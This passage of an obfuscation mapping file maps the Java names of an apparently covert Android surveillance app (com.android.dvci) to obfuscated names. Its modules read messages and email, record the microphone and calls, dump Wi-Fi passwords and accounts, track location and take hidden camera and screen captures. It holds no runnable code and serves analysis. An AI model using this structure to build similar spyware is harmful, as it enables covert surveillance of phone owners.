android.media.AmrInputStream -> android.media.AmrInputStream:
    com.android.dvci.module.message.Filter[] filterRuntime -> eV
    com.android.dvci.module.ModuleMessage$ProcessMailObserver obs -> eW
    java.util.concurrent.Semaphore stillReadingEmail -> eX
    90:161:boolean parse$7813568a(com.android.dvci.conf.ChildConf) -> localvar
    165:188:boolean readJson$13ded6b2(int,java.lang.String,com.android.dvci.conf.ChildConf,java.lang.String[]) -> Code
    225:246:void actualStart() -> O
    251:266:void actualStop() -> P
    271:290:void actualGo() -> N
    293:297:void initMail() -> ct
    300:305:void initSms() -> cu
    308:323:void initMms() -> cv
    327:334:void updateMarkupMMS(int) -> fingerprint
    340:342:void updateMarkupSMS(int) -> openfile
    349:362:void updateMarkupMail(java.lang.String,int,boolean) -> localclass
    367:400:java.lang.String[] getMailStores(java.lang.String) -> field_ids
    405:454:int readHistoricMail(java.util.Hashtable) -> Code
    458:480:int readHistoricMms(int) -> closefile
    488:504:int readHistoricSms(int) -> constants
    508:516:void saveSms(com.android.dvci.module.message.Sms) -> localvar
    519:536:void saveMms(com.android.dvci.module.message.Mms) -> Code
    540:547:boolean saveEmail(com.android.dvci.module.email.Email) -> Code
    552:577:void saveEvidenceEmail(com.android.dvci.module.email.Email,java.lang.String) -> Code
    585:609:boolean saveEvidenceSms(java.lang.String,byte[],long,boolean) -> Code
    614:615:int notification(com.android.dvci.module.message.Sms) -> Code
    620:624:int notification(com.android.dvci.module.message.Mms) -> localvar
    628:628:int getLastManagedMmsId() -> cw
    635:635:int getLastManagedSmsId() -> cx
    60:60:int notification(java.lang.Object) -> Code
    60:60:java.util.Hashtable access$000(com.android.dvci.module.ModuleMessage) -> Code
    60:60:int access$100(com.android.dvci.module.ModuleMessage,java.util.Hashtable) -> Code
com.android.dvci.module.ModuleMessage$1 -> stt.aq:
    com.android.dvci.module.ModuleMessage this$0 -> eY
    377:377:boolean accept(java.io.File,java.lang.String) -> accept
com.android.dvci.module.ModuleMessage$2 -> stt.ar:
    com.android.dvci.module.ModuleMessage this$0 -> eY
    391:391:boolean accept(java.io.File,java.lang.String) -> accept
com.android.dvci.module.ModuleMessage$ProcessMailObserver -> stt.ap$Code:
    java.lang.String pObserving -> eZ
    com.android.dvci.module.ModuleMessage this$0 -> eY
    201:215:int notification(com.android.dvci.ProcessInfo) -> Code
    191:191:int notification(java.lang.Object) -> Code
    208:218:java.lang.String chomp(java.lang.String,java.lang.String) -> zygoteapp
    232:249:java.lang.String unspace(java.lang.String) -> method_ids
    253:253:boolean isEmpty(java.lang.String) -> class_defs
    257:266:java.lang.String join$68fb8953(java.util.List,java.lang.String) -> Code
    274:283:java.lang.String join$965d9d1(java.lang.String[],java.lang.String) -> Code
    309:342:java.util.ArrayList readFileLines$3ff9fd98(java.lang.String) -> data
    346:346:java.lang.String[] split(java.lang.String) -> split
com.android.dvci.module.ModuleMic -> stt.as:
    byte[] AMR_HEADER -> eq
    com.android.dvci.module.StandByObserver standbyObserver -> fa
    int numFailures -> fb
    long fId -> fc
    int[] amr_sizes -> er
    android.media.MediaRecorder recorder -> bK
    boolean phoneListening -> fd
    com.android.dvci.module.ProcessObserver processObserver$1094ee4d -> fe
    java.util.HashSet blacklist$5a95723b -> ff
    boolean allowResume -> fg
    int index -> index
    byte[] unfinished -> fh
    boolean callOngoing -> fi
    83:99:void resetBlacklist() -> cy
    109:120:boolean isSpeechRecognitionActivityPresented() -> cz
    123:124:void addBlacklist(java.lang.String) -> link_data
    126:127:void delBlacklist(java.lang.String) -> magic
    129:129:boolean inInBlacklist(java.lang.String) -> checksum
    133:133:com.android.dvci.module.ModuleMic self() -> cA
    143:145:boolean parse$7813568a(com.android.dvci.conf.ChildConf) -> localvar
    161:190:void actualStart() -> O
    193:200:void startRecord() -> cB
    void specificStart() -> cC
    220:227:void actualStop() -> P
    void specificStop() -> cD
    241:292:void actualGo() -> N
    void specificGo(int) -> globalize
    297:306:void addPhoneListener() -> cE
    309:315:void removePhoneListener() -> cF
    319:339:void notifyProcess(com.android.dvci.ProcessInfo) -> localvar
    347:452:void saveRecorderEvidence() -> cG
    byte[] getAvailable() -> cH
    void stopRecorder() -> cI
    463:476:byte[] getAdditionalData() -> cJ
    480:493:int notification(com.android.dvci.Call) -> Code
    497:510:int notification(com.android.dvci.Standby) -> Code
    514:523:boolean isForegroundBlacklist() -> cK
    529:551:boolean canRecordMic() -> cL
    void specificSuspend() -> cM
    558:582:void resume() -> resume
    585:596:void suspend() -> suspend
    599:601:void stop() -> stop
    53:53:int notification(java.lang.Object) -> Code
com.android.dvci.module.ModuleMicL -> stt.at:
    com.android.dvci.file.AutoFile out_file -> fj
    byte[] unfinished -> fh
    42:44:void specificStop() -> cD
    48:55:void specificGo(int) -> globalize
    60:87:byte[] getAvailable() -> cH
    101:149:void specificStart() -> cC
    152:158:void createSockets() -> cN
    161:168:void deleteSockets() -> cO
    179:205:void stopRecorder() -> cI
    212:216:void specificSuspend() -> cM
    234:248:void onInfo(android.media.MediaRecorder,int,int) -> onInfo
    254:255:void onError(android.media.MediaRecorder,int,int) -> onError
com.android.dvci.module.ModulePassword -> stt.au:
    com.android.dvci.evidence.Markup markupPassword -> fk
    java.util.HashMap lastPasswords -> fl
    java.util.HashMap services -> fm
    35:50:boolean parse$7813568a(com.android.dvci.conf.ChildConf) -> localvar
    60:65:void actualStart() -> O
    73:125:void actualGo() -> N
    133:169:boolean dumpWifi(java.lang.String) -> signature
    174:178:java.lang.String getValue(java.lang.String) -> getValue
    185:223:void dumpAccounts$459b9629(com.android.dvci.module.ModuleAddressBook$1) -> Code
    233:240:java.lang.String getService(java.lang.String) -> file_size
    246:254:int getServiceId(java.lang.String) -> header_size
    261:261:void actualStop() -> P
    264:269:void addToEvidence(com.android.dvci.evidence.EvidenceBuilder,java.lang.String,java.lang.String,java.lang.String,java.lang.String) -> Code
    25:25:java.util.HashMap access$000(com.android.dvci.module.ModulePassword) -> Code
    25:25:com.android.dvci.evidence.Markup access$100(com.android.dvci.module.ModulePassword) -> localvar
    25:25:java.lang.String access$200(java.lang.String) -> endian_tag
    25:25:void access$300$3319e86f(com.android.dvci.evidence.EvidenceBuilder,java.lang.String,java.lang.String,java.lang.String,java.lang.String) -> localvar
com.android.dvci.module.ModulePassword$1 -> stt.av:
    com.android.dvci.evidence.EvidenceBuilder evidence -> fn
    boolean needToSerialize -> fo
    com.android.dvci.module.ModulePassword this$0 -> fp
    79:83:void close() -> close
    87:113:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.ModulePosition -> stt.aw:
    boolean gpsEnabled -> fq
    boolean cellEnabled -> fr
    boolean wifiEnabled -> fs
    java.lang.Object position -> ft
    boolean scanning -> fu
    com.android.dvci.module.ModulePosition$1 wifiReceiver$48665ecd -> fv
    byte[] $ -> lua_repeat
    65:92:boolean parse$7813568a(com.android.dvci.conf.ChildConf) -> localvar
    97:116:void actualStart() -> O
    122:131:void locationWIFI() -> cP
    138:139:void locationGPS() -> cQ
    149:171:void locationCELL() -> cR
    177:207:void onLocationChanged(android.location.Location) -> onLocationChanged
    215:233:void onWifiScan(java.util.List) -> Code
    238:251:byte[] getAdditionalData(int,int) -> instance
    264:292:byte[] messageEvidence(byte[],int) -> sort
    300:346:byte[] getWifiPayload(java.lang.String,java.lang.String,int) -> Code
    356:393:byte[] getCellPayload(com.android.dvci.CellInfo,int) -> Code
    407:483:byte[] getGPSPayload(android.location.Location,long) -> Code
    490:518:void registerWifiScan(android.net.wifi.WifiManager) -> Code
    39:39:boolean access$002$7f2a33dd(com.android.dvci.module.ModulePosition) -> Code
    java.lang.String $(int,int,int) -> localvar
com.android.dvci.module.ModulePosition$1 -> stt.ax:
    android.net.wifi.WifiManager val$wifiManager -> fw
    com.android.dvci.module.ModulePosition this$0 -> fx
    505:514:void onReceive(android.content.Context,android.content.Intent) -> onReceive
com.android.dvci.module.ModuleSnapshot -> stt.ay:
    android.view.Display display -> fy
    java.lang.String cameraSound -> fz
    int quality -> quality
    java.util.concurrent.Semaphore working -> fA
    boolean frameBuffer -> fB
    boolean screenCap -> fC
    byte[] $ -> lua_repeat
    84:107:boolean parse$7813568a(com.android.dvci.conf.ChildConf) -> localvar
    126:166:void actualStart() -> O
    175:211:boolean screencapMethod() -> cS
    229:230:android.graphics.Bitmap readPng(com.android.dvci.file.AutoFile) -> instance
    238:370:boolean frameBufferMethod() -> cT
    375:380:boolean isBlack(byte[]) -> lua_return
    384:398:boolean isTablet() -> cU
    402:419:boolean usesInvertedColors() -> cV
    423:439:byte[] getAdditionalData() -> cJ
    444:461:byte[] toJpeg(android.graphics.Bitmap) -> Code
    466:500:byte[] getRawBitmap() -> cW
    java.lang.String $$24d420ae() -> proto_ids
com.android.dvci.module.NullModule -> stt.az:
    16:16:boolean parse$7813568a(com.android.dvci.conf.ChildConf) -> localvar
    24:24:void actualGo() -> N
    31:31:void actualStart() -> O
    38:38:void actualStop() -> P
com.android.dvci.module.ProcessObserver -> stt.aA:
    com.android.dvci.module.ModuleMic module$a50c108 -> fD
    com.android.dvci.event.BaseEvent event -> fE
    22:25:int notification(com.android.dvci.ProcessInfo) -> Code
    7:7:int notification(java.lang.Object) -> Code
com.android.dvci.module.StandByObserver -> stt.aB:
    com.android.dvci.module.ModuleMic moduleMic -> fF
    16:16:int notification(com.android.dvci.Standby) -> Code
    6:6:int notification(java.lang.Object) -> Code
com.android.dvci.module.SubModule -> stt.aC:
    com.android.dvci.evidence.Markup markup -> magic
    com.android.dvci.module.ModuleChat module$a50c108 -> fG
    boolean enabled -> enabled
    14:17:void init$4ddb0c1b(com.android.dvci.module.ModuleChat,com.android.dvci.evidence.Markup) -> Code
    void start() -> start
    40:40:int notification(com.android.dvci.ProcessInfo) -> Code
    44:44:void startListen() -> cX
    47:47:void stopListen() -> cY
com.android.dvci.module.SubModuleManager -> stt.aD:
    com.android.dvci.module.ModuleChat module$a50c108 -> fG
    java.util.ArrayList submodules$7865b31 -> fH
    29:33:void add$62fcb526(com.android.dvci.module.chat.SubModuleChat) -> Code
    36:49:boolean start() -> cZ
    53:65:boolean stop() -> da
    69:72:boolean go() -> db
    84:100:int notification(com.android.dvci.ProcessInfo) -> Code
com.android.dvci.module.call.CallInfo -> stt.aE:
    int id -> id
    java.lang.String account -> fI
    java.lang.String peer -> fJ
    java.lang.String displayName -> fK
    boolean incoming -> mylist
    boolean valid -> openfile
    java.lang.String processName -> processName
    int programId -> fL
    java.util.Date timestamp -> cr
    boolean delay -> fM
    boolean realRate -> fN
    long[] streamId -> fO
    java.util.Date begin -> fP
    java.util.Date end -> fQ
    31:34:java.lang.String getCaller() -> dc
    38:41:java.lang.String getCallee() -> dd
    45:46:long getStreamId(boolean) -> openfile
    51:66:boolean setStreamId(boolean,long) -> Code
    71:85:boolean setStreamPid(int) -> main
    91:170:boolean update(boolean) -> closefile
com.android.dvci.module.call.Chunk -> stt.aF:
    java.lang.String encodedFile -> fR
    java.util.Date begin -> fP
    java.util.Date end -> fQ
    boolean remote -> fS
    int channel -> fT
com.android.dvci.module.call.EncodingTask -> stt.aG:
    com.android.dvci.module.ModuleCall moduleCall -> fU
    java.lang.Object sync -> el
    java.util.concurrent.LinkedBlockingQueue queue$19f590b5 -> fV
    boolean stopQueueMonitor -> fW
    32:36:void stop() -> stop
    39:47:void wake() -> de
    52:97:void run() -> run
    13:13:int notification(java.lang.Object) -> Code
com.android.dvci.module.call.RecordCall -> stt.aH:
    com.android.dvci.module.call.RecordCall singleton -> fX
    java.lang.String currentRecordFile -> fY
    int strategy -> fZ
    android.media.MediaRecorder recorder -> bK
    32:36:com.android.dvci.module.call.RecordCall self() -> df
    196:219:boolean startRecord$2f10955c(int,java.lang.String) -> localclass
    223:234:boolean stopRecord() -> dg
    238:287:boolean isSupported(com.android.dvci.module.ModuleCall) -> localvar
    291:352:boolean recordCall(com.android.dvci.module.ModuleCall,com.android.dvci.Call,boolean) -> Code
    21:21:java.lang.String access$000(com.android.dvci.module.call.RecordCall) -> Code
com.android.dvci.module.call.RecordCall$1 -> stt.aI:
    com.android.dvci.module.ModuleCall val$module -> ga
    com.android.dvci.Call val$call -> gb
    boolean val$incoming -> gc
    com.android.dvci.module.call.RecordCall this$0 -> gd
    295:298:void run() -> run
com.android.dvci.module.camera.CameraSnapshot -> stt.aJ:
    java.lang.Object cameraLock -> ge
    com.android.dvci.module.camera.CameraSnapshot singleton -> gf
    java.util.Hashtable enable -> gg
    com.android.dvci.module.camera.CameraSnapshot$1 autofocusCallback$5be0d91 -> gh
    com.android.dvci.module.camera.CameraSnapshot$2 errorCallback$589e2cd2 -> gi
    android.graphics.SurfaceTexture surface -> gj
    com.android.dvci.module.camera.CameraSnapshot$3 previewCallback$2a23b5ee -> gk
    104:107:com.android.dvci.module.camera.CameraSnapshot self() -> dh
    209:259:void snapshot(int) -> lua
    264:303:android.hardware.Camera openCamera(int) -> lua_main
    314:350:android.hardware.Camera prepareCamera$5b4daced(int) -> lua_and
    365:388:void choosePreviewSize$30a3c8c2(android.hardware.Camera$Parameters) -> Code
    437:454:android.hardware.Camera$Size getBestPreviewSize$3198ce76(android.hardware.Camera$Parameters) -> localvar
    459:467:boolean isBlack(byte[]) -> lua_return
    475:490:boolean releaseCamera(android.hardware.Camera) -> Code
    67:67:boolean access$000$3234f0de(byte[]) -> lua_then
    67:67:boolean access$100(com.android.dvci.module.camera.CameraSnapshot,android.hardware.Camera) -> Code
    67:67:java.lang.Object access$200(com.android.dvci.module.camera.CameraSnapshot) -> Code
com.android.dvci.module.camera.CameraSnapshot$1 -> stt.aK:
    com.android.dvci.module.camera.CameraSnapshot this$0 -> gl
    78:81:void onAutoFocus(boolean,android.hardware.Camera) -> onAutoFocus
com.android.dvci.module.camera.CameraSnapshot$2 -> stt.aL:
